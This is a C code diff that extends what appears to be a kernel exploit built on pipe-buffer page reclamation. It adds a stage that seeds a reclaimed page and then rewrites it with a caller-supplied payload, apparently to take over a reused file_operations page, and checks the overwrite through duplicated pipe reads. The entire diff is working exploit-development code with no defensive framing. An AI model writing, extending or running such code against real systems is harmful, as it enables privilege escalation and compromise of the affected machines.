@@ -19,6 +19,10 @@ static int pipe_fds_reclaim[PIPE_RECLAIM][2];
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
 static int p0_gate_holders[PIPE_RECLAIM][2];
 static int p0_gate_holders_initialized;
+#if defined(APP_FOPS_REWRITE_RECLAIMED_PAGE) && \
+    APP_FOPS_REWRITE_RECLAIMED_PAGE
+static int p0_rewrite_pipe_index = -1;
+#endif
 
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 static void close_p0_gate_holders(void) {
@@ -1042,6 +1046,10 @@ int prepare_p0_pipe_oracle(void) {
     p0_gate_holders[pipe_index][1] = -1;
   }
   p0_gate_holders_initialized = 1;
+#if defined(APP_FOPS_REWRITE_RECLAIMED_PAGE) && \
+    APP_FOPS_REWRITE_RECLAIMED_PAGE
+  p0_rewrite_pipe_index = -1;
+#endif
 
   pipebuf_page_base = prepare_pipe_buffer_page();
   if (!is_direct_ptr(pipebuf_page_base)) {
@@ -1143,6 +1151,24 @@ int verify_p0_pipe_oracle_gate(void) {
   }
   pr_info("p0 pipe gate hits=%d changed=%d\n",
           gate_hits, changed_pages);
+#if defined(APP_FOPS_REWRITE_RECLAIMED_PAGE) && \
+    APP_FOPS_REWRITE_RECLAIMED_PAGE
+  if (gate_hits == 1 && changed_pages == 0) {
+    unsigned char merge_seed[APP_REUSED_FOPS_PAGE_PRESERVE];
+    memset(merge_seed, 0xa5, sizeof(merge_seed));
+    if (!pipe_write_full(pipe_fds_reclaim[gate_pipe_index][1],
+                         merge_seed, sizeof(merge_seed))) {
+      pr_error("p0 payload rewrite seed failed pipe=%d errno=%d\n",
+               gate_pipe_index, errno);
+      spawn_p0_ref_keeper(-1);
+      return -1;
+    }
+    p0_rewrite_pipe_index = gate_pipe_index;
+    pipebuf_pipe_idx = gate_pipe_index;
+    pr_info("p0 payload rewrite seed ready pipe=%d slot=2 bytes=%zu\n",
+            gate_pipe_index, sizeof(merge_seed));
+  }
+#endif
   if (gate_hits != 0 || changed_pages != 0) {
     spawn_p0_ref_keeper(
         gate_hits == 1 && changed_pages == 0 ? gate_pipe_index : -1);
@@ -1157,6 +1183,53 @@ int verify_p0_pipe_oracle_gate(void) {
     return 0;
   }
   return -1;
+}
+
+int rewrite_p0_payload_page(const void *data, size_t size) {
+#if defined(APP_FOPS_REWRITE_RECLAIMED_PAGE) && \
+    APP_FOPS_REWRITE_RECLAIMED_PAGE
+  if (!data || size != PAGE_SIZE || p0_rewrite_pipe_index < 0 ||
+      APP_REUSED_FOPS_PAGE_PRESERVE < 18 ||
+      APP_REUSED_FOPS_PAGE_PRESERVE >= size) {
+    return 0;
+  }
+  const unsigned char *bytes = data;
+  if (!pipe_write_full(pipe_fds_reclaim[p0_rewrite_pipe_index][1],
+                       bytes + APP_REUSED_FOPS_PAGE_PRESERVE,
+                       size - APP_REUSED_FOPS_PAGE_PRESERVE)) {
+    pr_error("p0 payload rewrite write failed pipe=%d errno=%d\n",
+             p0_rewrite_pipe_index, errno);
+    return 0;
+  }
+
+  int snapshot[2] = {-1, -1};
+  unsigned char observed[PAGE_SIZE];
+  int duplicated = pipe_duplicate_bytes(
+      p0_gate_holders[p0_rewrite_pipe_index][0], snapshot, PAGE_SIZE, 1);
+  int read_ok = duplicated && pipe_read_full(snapshot[0], observed, PAGE_SIZE);
+  int prefix_ok = read_ok &&
+      memcmp(observed, "RMG-P0-ORACLE-GATE", 18) == 0;
+  int verified = prefix_ok &&
+      memcmp(observed + APP_REUSED_FOPS_PAGE_PRESERVE,
+             bytes + APP_REUSED_FOPS_PAGE_PRESERVE,
+             size - APP_REUSED_FOPS_PAGE_PRESERVE) == 0;
+  if (snapshot[0] >= 0) {
+    close(snapshot[0]);
+  }
+  if (snapshot[1] >= 0) {
+    close(snapshot[1]);
+  }
+  pr_info("p0 payload rewrite pipe=%d wrote=%zu duplicate=%d read=%d "
+          "prefix=%d verified=%d\n",
+          p0_rewrite_pipe_index,
+          size - APP_REUSED_FOPS_PAGE_PRESERVE, duplicated, read_ok,
+          prefix_ok, verified);
+  return verified;
+#else
+  (void)data;
+  (void)size;
+  return 0;
+#endif
 }
 
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
